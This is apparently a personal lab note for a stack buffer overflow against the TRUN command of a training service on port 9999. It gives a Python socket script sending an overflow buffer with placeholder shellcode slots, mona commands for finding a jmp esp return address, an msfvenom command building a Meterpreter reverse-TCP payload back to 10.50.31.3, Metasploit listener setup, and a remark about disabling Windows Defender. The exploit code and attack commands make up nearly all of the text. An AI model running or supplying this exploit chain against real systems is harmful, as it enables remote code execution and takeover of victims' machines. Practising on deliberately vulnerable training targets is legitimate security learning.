#!/usr/bin/python
import socket

buf = "TRUN /.:/"
buf += "A" * 2000 #increase # to ensure it is susceptible to buffer overflow
#buf += "<randomly generated from wiremask>"
#buf += "\xxx\xxx\xxx\xxx" #translate from big to little endian
#buf += "\x90" * 16 #NOP sled
#buf += <shell code copied from output of msfvenom command>
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # IP and TCP PORT

s.connect(("<TARGET IP/Windows box in this case>", 9999)) #connect to target ip and port
print s.recv(1024) #printing response

s.send(buf) # send value of buffer
print s.recv(1024) #print response

s.close() #close connection



run immunity.debugger as admin
run program
run python script (linops)

!mona modules -o
!mona jmp -r esp -m "essfunc.dll"

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.31.3 lport=4444 -b '\x00' -f python

set up listener:
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
show option
set lhost <linuxip>
show options
run
then run script


turned off windows defender in this demo



should finish opening a meterpreter shell without using debugger
> sysinfo
